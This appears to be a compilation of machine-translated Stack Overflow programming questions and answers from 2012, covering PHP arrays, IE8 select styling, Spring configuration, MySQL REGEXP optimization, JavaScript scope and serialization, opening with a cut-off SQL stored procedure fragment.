  @RowsForUpdate TableType READONLY,
  @RowsForDelete TableType READONLY
AS
BEGIN

  -- Update all the Descriptions for all the rows
  UPDATE
    t
  SET
    t.Descr = u.Descr
  FROM
    tbTotal t 
  INNER JOIN @RowsForUpdate u
    ON t.EntryDE = u.EntryDE AND t.MetricId = u.MetricId

  -- Delete the rows to be deleted
  DELETE t 
  FROM tbTotal t
  INNER JOIN @RowsForDelete d
    ON t.EntryDE = u.EntryDE AND t.MetricId = u.MetricId

END 
```

# php - 从 PHP 多维数组中检索值

> ID：12318052
> 
> 赞同：2
> 
> 时间：2012-09-07T12:24:45.477
> 
> 标签：php, arrays, multidimensional-array

我有一个多维数组，我想从中为网站管理员打印统计信息。我的问题是，一旦我以我想要的格式将数据放入数组中，我就无法弄清楚如何检索它。我必须知道关键值才能得到它，例如`$uniqueBrowser["Firefox"]["14.0.1"]['times'];`

例如，我想说 Firefox 70%，IE 30% 作为开始（汇总浏览器的所有版本“使用时间”）。然后我想进一步深入到特定版本，例如 FF3.6 14%、FF14 51% 等（只需打印出与版本相关的时间值）。

**编辑**：我的问题是，如何以上述方式检索我的数据？我的头被炸了，我在这方面已经太久了。请有人让我摆脱痛苦。如果有更好的方法可以做到这一点，也请告诉我。

我到目前为止的代码如下。此代码在 for each 循环中运行，该循环遍历数据库返回的数据。和变量设置为在循环的每次迭代中从数据库返回的浏览器值和版本`$browser`值。`$version``foreach`

```
if(in_array($browser, $uniqueBrowser)) {        
    if(in_array($version, $uniqueBrowser[$browser])) {
        $uniqueBrowser[$browser][$version]['times'] = $uniqueBrowser[$browser][$version]['times'] + 1;
    } else {            
        $uniqueBrowser[$browser]['version'] = $version;
        $uniqueBrowser[$browser][$version]['times'] = 1;
    }       
} else {
    $uniqueBrowser[] = $browser;
    $uniqueBrowser[$browser]['version'] = $version;
    $uniqueBrowser[$browser][$version]['times'] = 1;
} 
```

当我运行这段代码时，它给了我这个（通过 var_dump）：

```
Browser data: array(4) {
  [0]=>
  string(7) "Firefox"
  ["Firefox"]=>
  array(3) {
    ["version"]=>
    string(6) "14.0.1"
    [15]=>
    array(1) {
      ["times"]=>
      int(2)
    }
    ["14.0.1"]=>
    array(1) {
      ["times"]=>
      int(15)
    }
  }
  [1]=>
  string(17) "Internet Explorer"
  ["Internet Explorer"]=>
  array(2) {
    ["version"]=>
    string(9) "8.0.0.253"
    ["8.0.0.253"]=>
    array(1) {
      ["times"]=>
      int(1)
    }
  }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T12:36:49.953

您应该让数据库为您完成工作，并以您想要的格式从查询中检索值，而不是从数据库中获取数据并将其放入复杂的数组中。

让数据库来做计算，不要用 PHP 来做。它使它变得过于复杂。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T12:44:44.387

我知道[JvdBerg](https://stackoverflow.com/a/12318257/467546)已经给出了这样的答案，但我先添加了我的评论。所以我不觉得我在模仿他。

例如，我创建了以下表结构。希望它和你的一样。

```
+---------+------------------+------+-----+---------+----------------+
| Field   | Type             | Null | Key | Default | Extra          |
+---------+------------------+------+-----+---------+----------------+
| id      | int(11) unsigned | NO   | PRI | NULL    | auto_increment |
| browser | varchar(120)     | YES  |     | NULL    |                |
| version | varchar(50)      | YES  |     | NULL    |                |
+---------+------------------+------+-----+---------+----------------+ 
```

然后我再次插入以下行，希望像你的一样。

```
+----+---------+---------+
| id | browser | version |
+----+---------+---------+
|  1 | Firefox | 3.6     |
|  2 | Firefox | 4.1     |
|  3 | Firefox | 3.6     |
|  4 | Safari  | 5.1.7   |
|  5 | Safari  | 6       |
|  6 | Firefox | 14.0.1  |
|  7 | IE      | 7       |
|  8 | IE      | 8       |
|  9 | IE      | 7       |
| 10 | Firefox | 14.0.1  |
| 11 | Opera   | 12.0.1  |
| 12 | Safari  | 5.1.7   |
+----+---------+---------+ 
```

然后下面的查询产生了这些结果。

```
mysql> SELECT browser, version, COUNT(version) AS times FROM demo.browsers GROUP BY browser;
+---------+---------+-------+
| browser | version | times |
+---------+---------+-------+
| Firefox | 3.6     |     5 |
| IE      | 7       |     3 |
| Opera   | 12.0.1  |     1 |
| Safari  | 5.1.7   |     3 |
+---------+---------+-------+ 
```

如果你想让它更精确，你可以使用`GROUP BY browser, version`而不是仅仅通过浏览器。

```
mysql> SELECT browser, version, COUNT(version) AS times FROM demo.browsers GROUP BY browser, version;
+---------+---------+-------+
| browser | version | times |
+---------+---------+-------+
| Firefox | 14.0.1  |     2 |
| Firefox | 3.6     |     2 |
| Firefox | 4.1     |     1 |
| IE      | 7       |     2 |
| IE      | 8       |     1 |
| Opera   | 12.0.1  |     1 |
| Safari  | 5.1.7   |     2 |
| Safari  | 6       |     1 |
+---------+---------+-------+ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T12:34:36.257

我不确定我是否完全理解您的问题，但是您是否尝试过使用扩展的 for 循环遍历数组？

例如：

```
foreach ($uniqueBrowser as $browserName=>$values){

    echo $browserName .' contains '. print_r($values,true);

} 
```

# html - IE 8 固定宽度选择问题

> ID：12318057
> 
> 赞同：3
> 
> 时间：2012-09-07T12:24:53.743
> 
> 标签：html, css, internet-explorer-8, html-select

我必须`select`在我的 html 中指定宽度。

它在除 IE8 之外的所有浏览器中都能正常工作，它会剪切超过宽度的文本

CSS

```
select {
        border: 1px solid #65A6BA;
        font-size: 11px;
        margin-left: 22px;
        width: 166px;
    } 
```

HTML

```
<select>
        <option value="1">Some text</option>
        <option value="2">Text Larger Than the Width of select</option>
        <option value="3">Some text</option>
        <option value="4">Some text</option>
        <option value="5">Some text</option>
    </select> 
```

[演示](http://jsfiddle.net/Hj7Pp/)

我对 js、jquery 解决方案持开放态度，但更喜欢仅使用 css 的解决方案

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-07T13:59:03.673

解决它！

这是修改后的 jsFiddle：http: [//jsfiddle.net/PLqzQ/](http://jsfiddle.net/PLqzQ/)

诀窍是将`focus`选择器添加到您的 CSS 中，使其看起来像这样：

```
select {
        border: 1px solid #65A6BA;
        font-size: 11px;
        margin-left: 22px;
        width: 166px;
        overflow:visible ;
    }

select:focus { width:auto ;
position:relative ;
}​ 
```

我在 IE8 中对其进行了测试，它就像一个魅力。

非常重要：您必须将 Doctype 定义添加到您的代码中，否则该修复程序将不适用于 IE8。

例子 `<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-02-07T05:37:56.637

我发现所有其他答案都非常不稳定且过于复杂。这可以通过以下 CSS 轻松完成（至少在我的情况下）：

```
html.IE8 .SelectContainer {
    position: relative;
}

html.IE8 .SelectContainer select {
    position: absolute;
    width: auto; /* Or fixed if you want. */
    max-width: 100%;
}

html.IE8 .SelectContainer select:focus {
    max-width: none;
} 
```

如果浏览器是 IE8（或更低） ，我在元素上设置一个类`html`（谷歌如何做到这一点）。

把你`select`放在里面`.SelectContainer`，当你点击它时，它会根据需要展开。

不需要 jQuery、条件注释等。至少满足我的需要，更简单，工作更流畅。

我希望你们都不必雇用这个。

美国政府是时候升级到现代浏览器了！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T19:41:52.277

我遇到了同样的问题，也尝试了*mouseenter*和*mouseleave*，但我认为它看起来很笨拙。我检查了[选择元素的事件列表（来自 MSDN）](http://msdn.microsoft.com/en-us/library/ie/ms535893%28v=vs.85%29.aspx)并尝试使用*beforeactivate*和*deactivate* intead 。在我看来，它工作得更顺利。在一个直接在IE8下运行的页面上测试（不是兼容模式）：

```
$('select').beforeactivate(function () {
    var isIE8 = $.browser.version.substring(0, 2) === "8.";
    if (!isIE8)
        return;
    $(this).css('width', 'auto');

});

$('select').deactivate(function () {
    var isIE8 = $.browser.version.substring(0, 2) === "8.";
    if (!isIE8)
        return;
    $(this).css('width', '166px');
}); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-07T21:47:41.573

有问题的页面是一个非常旧的页面，它强制 IE 8 进入兼容模式，因此 css 解决方案不起作用。

我结束了使用以下部分修复它`jquery`

假设 select 有一个类`fixedWidth`

```
$el = $("select.fixedWidth");
$el.data("origWidth", $el.outerWidth()) 

$el.mouseenter(function(){
    $(this).css("width", "auto");
  })
  .bind("blur change", function(){
    el = $(this);
    el.css("width", el.data("origWidth"));
  }); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-01-20T10:46:23.110

[按照它可能会有所帮助的链接。](http://jsfiddle.net/FSsG8/1/)

```
<script>
  $(document).ready(function() {
    $('select').change(function(){
      $("#width_tmp").html($('select option:selected').text());
      $(this).width($("#width_tmp").width()+30); // 30 : the size of the down arrow of the select box 
    });
  });
</script> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-05-08T09:40:31.437

这是我在整理 IE8 问题时偶然发现的一个方便的插件。看看，[IE8 EXPAND SELECT WIDTH](http://powerkiki.github.io/ie_expand_select_width/)。效果惊人。轻松即插即用。

* * *

## 回答 #7

> 赞同：-4
> 
> 时间：2012-09-07T13:24:48.027

我认为您应该更改`width`属性设置：而不是固定`168px`使用`width:auto;`应该可以正常工作。

# java - 将参数传递给 Spring MethodInvokingFactoryBean 参数列表

> ID：12318062
> 
> 赞同：13
> 
> 时间：2012-09-07T12:25:16.020
> 
> 标签：java, spring, inversion-of-control

我正在尝试找到将对象传递给`Spring` `MethodInvokingFactoryBean`参数列表的方法。这是我的`Spring`配置：

```
<bean id="qName" class="javax.xml.namespace.QName">
    <constructor-arg index="0" value="${com.groupgti.esb.online.tests.talentq.tns}"/>
    <constructor-arg index="1" value="${com.groupgti.esb.online.tests.talentq.serviceName}"/>
</bean>

<bean id="wsdlUrl" class="java.net.URL">
    <constructor-arg index="0" value="${com.groupgti.esb.online.tests.talentq.url}"/>
</bean>

<bean id="service" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
    <property name="targetObject">
        <bean id="serviceObject" class="com.groupgti.onlinetest.talentq.jaxb.TQIntegrationV2"/>
    </property>
    <property name="targetMethod">
        <value>create</value>
    </property>
    <property name="arguments">
        <list>
            <value type="java.net.URL">wsdlUrl</value>
            <value type="javax.xml.namespace.QName">qName</value>
        </list>
    </property>
</bean> 
```

这不起作用：

```
<value type="java.net.URL">wsdlUrl</value>
<value type="javax.xml.namespace.QName">qName</value> 
```

我得到了例外：

```
Caused by: org.springframework.beans.TypeMismatchException: Failed to convert value of type 'java.lang.String' to required type 'java.net.URL'; nested exception is java.lang.IllegalArgumentException: Could not retrieve URL for OSGi resource[wsdlUrl|bnd.id=573|bnd.sym=com.groupgti.esb.online.tests.talentq]: OSGi resource[wsdlUrl|bnd.id=573|bnd.sym=com.groupgti.esb.online.tests.talentq] cannot be resolved to URL because it does not exist 
```

这是因为参数是作为`String`，只是`wsdlUrl`而不是作为`java.net.URL`对象传递的。

我也试过这个：

```
<property name="arguments">
    <ref bean="wsdlUrl"/>
    <ref bean="qName"/>
</property> 
```

这给了我一个例外，即`ref`属性不属于这里。那么我应该如何将对象传递给参数列表呢？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-07T12:38:38.190

找到了解决方案。我必须添加`<list>`然后声明`<ref>`：

```
<property name="arguments">
    <list>
        <ref bean="wsdlUrl"/>
        <ref bean="qName"/>
    </list>
</property> 
```

像这样，一切正常。

# java - jar 文件位置 - ear 文件或服务器 lib 文件夹？

> ID：12318071
> 
> 赞同：0
> 
> 时间：2012-09-07T12:25:40.667
> 
> 标签：java, jboss

将应用程序部署到 JBoss 服务器时，对于像 ojdbc14.jar (Oracle JDBC) 这样的 JAR，最好将此 jar 包含在部署的 ear 文件中，还是应该将其部署到 JBoss 的 server/default/lib 文件夹？

我得到的论点是应用程序需要支持全局事务，因此数据源必须在应用程序服务器级别定义（例如复制到 server/default/lib 文件夹），以便它可以与其他应用程序服务器通信，并且要发生这种情况，您需要应用服务器级别的驱动程序。

我想听听这里的正确方法是什么。谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T13:02:18.137

我相信这是正确的做法。

您通常会使用适当的配置文件在您的应用程序之外（EAR/WAR 之外）定义您的数据源，具体取决于您使用的应用程序服务器。而在 JBoss 上，您通常将配置添加到 XML 文件中，而使用 WebLogic，您可以直接使用管理控制台创建数据源。

鉴于此数据源将在服务器启动时创建，必要的库（在您的情况下为 ojdbc14.jar）必须在应用程序服务器的类路径上可用。

我还遇到了许可问题，即使用 3rd 方库会阻止您将其捆绑到应用程序中。

此外，在应用程序之外定义数据源意味着您不必在数据源配置需要更改时执行重建。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T13:02:34.243

我这样做了很多次...

如果 jar 与 JDBC 有关，我**总是**将它放在文件夹中。`server/default/lib`

因为您的数据库驱动程序会在服务器启动后立即加载一次，而不是每次您部署/取消部署您正在处理的 Web 应用程序时。

您的数据源也可用于任何其他子项目，当您有一个用于集成测试的特定项目时，这将是一个很大的优势。

# asp.net-mvc-3 - Url.Action 没有给出预期的结果。不需要的路由值仍然存在

> ID：12318074
> 
> 赞同：6
> 
> 时间：2012-09-07T12:25:49.197
> 
> 标签：asp.net-mvc-3, url, routes

我有一个带有多条路线的 MVC3 应用程序。其中两个定义如下：

```
routes.MapRoute(
  null,
  "System/{name}", // URL with parameters
  new { controller = "Systems", action = "Index" } // Parameter defaults
);
routes.MapRoute(
  null,
  "Carrier/{name}", // URL with parameters
  new { controller = "Carriers", action = "Index" } // Parameter defaults
); 
```

现在，在我的菜单中，我有两个指向使用 Url.Action 创建的这些路由的链接：

```
Url.Action("Index","Systems")
Url.Action("Index","Carriers") 
```

现在，当我启动应用程序时，一切似乎都很好，菜单中的链接显示为`/System/`和`/Carrier/`，这是预期值。

但是，当我浏览到例如`/System/MySystem`在网页中时，我仍然希望链接指向同一个地方，但现在它们指向`/System/MySystem`and `/Carrier/MySystem`。

我已经尝试了很多方法来阻止链接使用路由值中的名称，但无济于事。我遇到的最奇怪的情况是当我尝试这个时：

```
Url.Action("Index","Systems", new{name = (string)null}) 
```

现在链接显示为

```
/System?name=MySystem 
```

这里有什么好的方法来确保路由值中的名称值不会以任何方式干扰这些链接吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-07T15:20:21.627

正如您所注意到的，`Url.`帮助程序重用了先前给定的路由参数。

作为一种解决方法（我希望有一个更优雅的解决方案......），您可以从您的视图中删除该`name`条目：`RouteData.Values`

因此，在您认为给您打电话之前`Url.Action`：

```
Url.Action("Index","Systems")
Url.Action("Index","Carriers") 
```

`name`从中删除预填充`RequestContext`：

```
@{
     Request.RequestContext.RouteData.Values.Remove("name");
} 
```

`name`这也是一种解决方法，但如果您稍微修改您的路线并为您的分段提供默认空值：

```
routes.MapRoute(
  null,
  "System/{name}", // URL with parameters
  new { controller = "Systems", action = "Index", name = (string)null }
);
routes.MapRoute(
  null,
  "Carrier/{name}", // URL with parameters
  new { controller = "Carriers", action = "Index", name = (string)null }
); 
```

您的原始解决方案（“归零”`name`中的`Url.Action`）也将起作用：

```
@Url.Action("Index", "Systems" , new {name = (string)null} ) 
```

# c++ - 为什么 AutoSuggestion 列表不会在 MFC 中按 Enter 关闭？

> ID：12318077
> 
> 赞同：0
> 
> 时间：2012-09-07T12:26:00.137
> 
> 标签：c++, c, visual-c++, mfc

我有一个 MFC 对话框应用程序。我在对话框中添加一个编辑控件并使用以下代码打开自动建议

```
SHAutoComplete(txtPath.m_hWnd, SHACF_FILESYS_DIRS); 
```

一切正常。但是当我滚动 Suggestion 列表并按 Enter 时，该列表不会关闭。我怎样才能做到这一点？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:32:28.337

看看[这里](http://support.microsoft.com/kb/102589)：如何在对话框中使用编辑控件中的 ENTER 键

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-10T06:15:04.707

使用加速器捕捉按键并执行所需操作的最佳方式。我将 Enter Key 行为修改为 Tab 键行为。

```
void CHDVRLauncherDlg::OnMyEnter() 
{  
  int btnID = 0;
  CWnd * pFocus = GetFocus();  

  if(pFocus != NULL)
    btnID = pFocus->GetDlgCtrlID();

  NextInTabOrder();      
}

void CHDVRLauncherDlg::NextInTabOrder()
{  
   CWnd* pWndNext = GetNextDlgTabItem(GetFocus());
   if(pWndNext) 
     pWndNext->SetFocus();
} 
```

谢谢您的回复。

# ssis - 如何根据日期选择多个 CSV 文件并加载到表中

> ID：12318078
> 
> 赞同：0
> 
> 时间：2012-09-07T12:26:03.727
> 
> 标签：ssis

我每天都会在一个名为 INPUTFILES 的文件夹中接收输入文件。这些文件具有文件名和日期时间。

我的包已安排每天运行。如果我当天收到 2 个文件，我需要获取这 2 个文件并加载到表中。

例如，我的文件中有文件

test20120508_122334.csv
test20120608_122455.csv
test20120608_014455.csv

现在我需要在同一天运行文件 test20120608_122455.csv test20120608_014455.csv。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T08:34:05.477

我解决了这个问题。我采用了一个变量来检查该特定日期是否存在文件。

如果文件在特定日期存在，则变量的值分配为 1。

For Each Loop Container 已被提取，并将此文件存在变量放在容器内。

```
For Loop Properties  

EvalExpression ---- @fileexists==1\. 
```

如果该特定日期不存在文件，则循环失败。

# java - 具有导出功能的“将 primefaces 图表另存为”

> ID：12318082
> 
> 赞同：2
> 
> 时间：2012-09-07T12:26:29.767
> 
> 标签：java, javascript, primefaces

我在 WebSphere Application Srever 8 上使用 Primefaces 3.4 和 Apache MyFaces 2.1.8。

我有一些图表。现在我想让图表保存为图像成为可能。PF 带有图表的导出功能。

在 PF 展示中，他们在新对话框中导出图像： [看这里](http://www.primefaces.org/showcase/ui/chartExport.jsf)

当我按下按钮时，我想获得典型的“另存为”对话框。

有人可以给我一个提示如何为此编写javascript吗？

是这样的：

```
 <script type="text/javascript">
        //         
        function exportChart() {
            //export image
            $('#chart').exportAsImage();
        }
        //
    </script> 
```

此致

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-20T04:45:35.303

我迟到了，但希望它能帮助其他人解决问题。

确保“chart”和“dlg”是 javascript 变量

```
<script type="text/javascript">
    //         
    function exportChart() {
        //export image
        $('#output').empty().append(chart.exportAsImage());

        //show the dialog  
        dlg.show();
    }
    //
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-08-13T17:35:21.933

导出的图片是64的图片库。可以使用next：

```
yourInputText.value = chart.exportAsImage().src; 
```

# mysql - 针对 REGEXP 的 Mysql 优化

> ID：12318083
> 
> 赞同：10
> 
> 时间：2012-09-07T12:26:30.553
> 
> 标签：mysql, regex, optimization, indexing, query-optimization

这个查询（用不同的名字而不是“jack”）在我的慢查询日志中发生了很多次。为什么？

Users 表有很多字段（比我选择的这三个还多）和大约 40.000 行。

`select name,username,id from Users where ( name REGEXP '[[:<:]]jack[[:>:]]' ) or ( username REGEXP '[[:<:]]jack[[:>:]]' ) order by name limit 0,5;`

`id`是主要的和自动增量的。
`name`有一个索引。
`username`有唯一的索引。

有时需要3秒！如果我解释 MySQL 上的选择，我有这个：

```
select type: SIMPLE
table: Users
type: index
possible keys: NULL
key: name
key len: 452
ref: NULL
rows: 5
extra: Using where 
```

这是我能做的最好的吗？我能解决什么问题？

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-09-07T13:28:48.003

如果你必须使用正则表达式风格的`WHERE`子句，你肯定会被慢查询问题所困扰。为了使 regexp 样式的搜索起作用，MySQL 必须将 name 列中的每个值与 regexp 进行比较。而且，您的查询还通过查看您的用户名列使麻烦加倍。

这意味着 MySQL 不能利用任何索引，这就是所有 DBMS 加速大表查询的方式。

您可以尝试几件事。所有这些都涉及与 REGEXP 说再见。

一个是这样的：

```
WHERE name LIKE CONCAT('jack', '%') OR username LIKE CONCAT('jack', '%') 
```

如果您在名称和用户名列上创建索引，这应该很快。它将查找以“jack”开头的所有名称/用户名。请注意

```
WHERE name LIKE CONCAT('%','jack') /* SLOW!!! */ 
```

将查找以“jack”结尾的名称，但会像您的正则表达式样式搜索一样慢。

您可以做的另一件事是弄清楚为什么您的应用程序需要能够搜索名称或用户名的一部分。您可以从您的应用程序中消除此功能，或者找出一些更好的方法来处理它。

可能的更好方法：

1.  要求您的用户将他们的姓名分解为名字和姓氏字段，并分别搜索。
2.  创建一个单独的“搜索所有用户”功能，该功能仅在用户需要时使用，从而降低慢速 regexp 样式查询的频率。
3.  使用某种预处理程序自己将他们的名字分解成一个单独的名字词表。搜索不带正则表达式的名称词表。
4.  弄清楚如何使用 MySQL 全文搜索来实现此功能。

所有这些都涉及一些编程工作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-04T23:13:03.107

`fieldname`仅通过在 where 子句中添加 != ''就达到了 50% 的加速。它使mysql使用索引。

```
SELECT name, username, id 
FROM users 
WHERE name != '' 
    AND (name REGEXP '[[:<:]]jack[[:>:]]' or username REGEXP '[[:<:]]jack[[:>:]]') 
ORDER BY name 
LIMIT 0,5; 
```

不是一个完美的解决方案，但有帮助。

* * *

## 回答 #3

> 赞同：-4
> 
> 时间：2013-02-07T18:42:13.197

在前面加上“LIKE”

从

```
SELECT cat_ID, categoryName FROM category WHERE cat_ID REGEXP '^15-64-8$' ORDER BY categoryName 
```

到

```
SELECT cat_ID, categoryName FROM category WHERE cat_ID LIKE '15-64-8%' and cat_ID REGEXP '^15-64-8$' ORDER BY categoryName 
```

对于 cos，只有当 U r 搜索短语 U 知道以什么开头时才有效，否则全文索引是解决方案。

# bash - BASH BSON 解析器

> ID：12318086
> 
> 赞同：1
> 
> 时间：2012-09-07T12:26:47.627
> 
> 标签：bash, parsing, mongodb, bson

我们需要从 BASH shell 脚本中查询 Mongo DB。使用 eval 和 Mongo 的 printjson() 给了我文本输出，但它需要被解析。使用其他脚本语言（Python、Ruby、Erlang 等）不是一种选择。

我查看了 JSON.sh （一个 BASH 脚本库 JSON 解析器：[https](https://github.com/rcrowley/json.sh) ://github.com/rcrowley/json.sh ），除了它无法识别 BSON 的问题之外，它似乎接近解决方案，但是 -非 JSON 数据类型。在我尝试修改它以识别 BSON 数据类型之前，有人知道现有的解决方案吗？

谢谢。

10/11 下面 Stennie 注意到我在 MongoDB 用户组中收到了答复，并提供了一个 URL。答案非常好和完整，并开始，“MongoDB 实际上使用我们称之为 Mongo Extended JSON 的东西，它与 vanilla JSON 标准有点不同......”所以我将不得不修改解析器。谢谢大家。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T15:07:13.260

您是否可能想使用`tojson()`而不是`printjson()`循环通过 tojson() 的结果来解析字段？

# javascript - 在 onload 函数中定义的函数的未捕获 ReferenceError

> ID：12318089
> 
> 赞同：2
> 
> 时间：2012-09-07T12:26:52.083
> 
> 标签：javascript

HTML：

```
<div id="myID" onclick="cc(this.id)">Click Here</div>​ 
```

JavaScript：

```
var timer;
var firing = false;
var begen = function(id) {
    alert('tek');
};

var popupAc = function(id) {
    alert('çift');
};

function cc(id) {
    if (firing) {
        popupAc(id);
        clearTimeout(timer);
        firing = false;
        return;
    }
    firing = true;
    timer = setTimeout(function() {
        //begen(id);
        clearTimeout(timer);
        firing = false;
    }, 250);
} 
```

错误：

```
Uncaught ReferenceError: cc is not defined 
```

示例：http: [//jsfiddle.net/LXSZj/3/](http://jsfiddle.net/LXSZj/3/)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-07T12:30:00.820

您的 JSFiddle 首选项设置为“onload”，因此 JavaScript 窗格的内容被包装在一个函数中。

这个范围`cc`（`dd`不存在，为 jsfiddle 示例创建了一个额外的问题）到该函数并停止它是一个全局的。

由于您尝试从内部事件属性调用它，因此您处于不同的范围内并且无法访问它。

作为快速修复，您可以将首选项更改为“nowrap”，但这不会使代码符合最佳实践。

建议避免使用固有事件属性，而是[使用 Javascript 绑定事件处理程序](https://developer.mozilla.org/en-US/docs/DOM/event#Registering_event_listeners)。YUI3 提供了一个[事件模块](http://yuilibrary.com/yui/docs/event/)，而 jQuery 提供了帮助解决此问题的[`on`方法](http://api.jquery.com/on/)（其他库可用）。另请参阅：[不显眼的 JavaScript](http://en.wikipedia.org/wiki/Unobtrusive_JavaScript)。

例如，[请参阅这个 js fiddle](http://jsfiddle.net/LXSZj/9/)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T12:31:01.507

确实如此，您的小提琴中只有两个错误：

*   你打电话`dd`而不是`cc`
*   您将整个 javascript 包装在一个 onload-function 中（请参见左侧的下拉菜单），并且变量和函数是本地的。将其移至全局范围，或将`cc`函数分配给全局对象：`window.cc = function(){…};`

[修正版](http://jsfiddle.net/LXSZj/5/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T12:30:50.020

```
window.cc = function(id) { ... 
```

变量和函数似乎在它们的范围内......

# c# - .NET MVC 应用程序的高 CPU 和内存使用率

> ID：12318092
> 
> 赞同：5
> 
> 时间：2012-09-07T12:27:05.147
> 
> 标签：c#, .net, asp.net-mvc-3, memory, cpu-usage

我们看到我们的一个 .NET MVC 应用程序占用了大量的 CPU 和内存，并且似乎无法找到它的原因。我们的团队无法访问 Web 服务器本身，而是会在达到某些限制（CPU 或内存的 90+%）时自动收到通知。在本地运行我们似乎找不到问题。我们*认为*可能是罪魁祸首的一些项目

*   当用户执行某些操作时，应用程序会在后台运行许多线程
*   我们正在使用 memcached（在与 Web 服务器不同的机器上）
*   我们正在使用网络套接字

除此之外，就 Web 应用程序而言，该应用程序是相当标准的。这里有几个表格，那里有登录/注销，一些管理用户和数据的管理功能；没有什么超级花哨的。

我正在研究两种不同的解决方案，并想知道什么是最好的。

1.  在应用程序本身内创建一个页面（仅适用于应用程序管理员），显示有关正在使用的内存和 CPU 的信息。有没有这样的例子，甚至有可能吗？
2.  使用安装在 Web 服务器上的某种类型的 3rd 方分析服务或应用程序，并允许我们向下查找导致应用程序中 CPU 和内存使用率高的原因。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-25T21:05:05.747

我推荐了 asp.net mvc miniprofiler。[http://miniprofiler.com/](http://miniprofiler.com/)

它易于实现和扩展，可以在生产模式下运行，可以将其结果存储到 SQL Server。我多次使用它来发现困难的性能问题。

另一种可能性是结合使用[http://getglimpse.com/](http://getglimpse.com/)和 miniprofiler glimpse-plugin [https://github.com/mcliment/miniprofiler-glimpse-plugin](https://github.com/mcliment/miniprofiler-glimpse-plugin)

这两个工具都是开源的，不需要管理员访问服务器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-21T13:10:24.000

您可以将 Preemptive 的运行时智能连接到它。- [http://www.preemptive.com/](http://www.preemptive.com/)

否则，分析器或负载测试可以帮助找到问题。您有任何监控实际机器健康状况的东西吗？（处理器使用情况、内存使用情况、磁盘队列长度等）。

[http://blogs.msdn.com/b/visualstudioalm/archive/2012/06/04/getting-started-with-load-testing-in-visual-studio-2012.aspx](http://blogs.msdn.com/b/visualstudioalm/archive/2012/06/04/getting-started-with-load-testing-in-visual-studio-2012.aspx)

Visual Studio 有一个内置的[分析器](http://msdn.microsoft.com/en-us/library/ms182372.aspx)（取决于版本和版本）。您可以通过[WMI 查询](https://stackoverflow.com/questions/1807271/what-are-some-common-wmi-queries)有问题的 Web 服务器，或者编写/提供诊断记录/监控工具以将它们交给有权访问的人。

你有任何输出缓存吗？什么版本的IIS？您是否会收到 90% 的处理器使用率警报，表明您的 Web 进程实际上是在执行此操作？（如果警报配置不正确，可能不是您的应用程序）

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2013-03-25T21:01:32.383

我有类似的情况，我根据[这个项目为我的应用管理员创建了一个系统监视器](http://www.codeproject.com/Articles/312429/Creating-a-System-Monitoring-Service-in-NET)

# java - -Xlint 重新编译。为什么默认不开启？

> ID：12318096
> 
> 赞同：2
> 
> 时间：2012-09-07T12:27:19.400
> 
> 标签：java

我想知道使用 -Xlint 编译是否会对构建过程或项目产生负面影响？

如果不是，为什么在 java 编译器中默认不打开这个？

我可以只打开所有警告，即使在构建我的应用程序的发布版本期间也可以忘记这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:06:41.313

如果您愿意，您可以打开所有警告。有更好的静态分析工具也可以帮助您解决问题，恕我直言，Xlint 是出于历史原因而存在的。

# serialization - 为什么我们使用序列化？

> ID：12318097
> 
> 赞同：45
> 
> 时间：2012-09-07T12:27:19.310
> 
> 标签：serialization

为什么我们需要使用序列化？
如果我们想通过网络发送一个对象或一段数据，我们可以使用字节流。
如果我们想将一些数据保存到磁盘我们可以再次使用二进制模式以及字节流并保存它。
那么使用序列化有什么好处呢？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-09-07T12:49:44.580

从技术上讲，您的序列化对象也将最终成为电缆或文件系统上的字节流......

因此，您也可以将其视为将对象转换为字节流的标准化且已经可用的方法。存储/传输对象是一个非常普遍的需求，在每个应用程序中重新发明这个轮子几乎没有意义。

正如其他人所提到的，您也知道这个 object->stream_of_bytes 实现非常健壮、经过测试并且通常独立于体系结构。

这并不意味着它是保存或传输对象的唯一可接受的方式：在某些情况下，您必须实现自己的方法，例如避免保存不必要的/私有成员（例如出于安全或性能原因）。但是，如果您是在一个简单的情况下，您可以通过使用框架、语言或 VM 的序列化/反序列化来让您的生活更轻松，而不必自己实现它。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-09-07T12:29:44.970

在架构之间兼容的其他原因。从一个架构到另一个架构，有时从一个编译器到另一个编译器，整数的字节数不同。

另外，您所说的仍然是序列化。二进制序列化。您将对象的所有字节放在一起，以便存储它们并在以后将它们重新转换为对象。这是序列化。

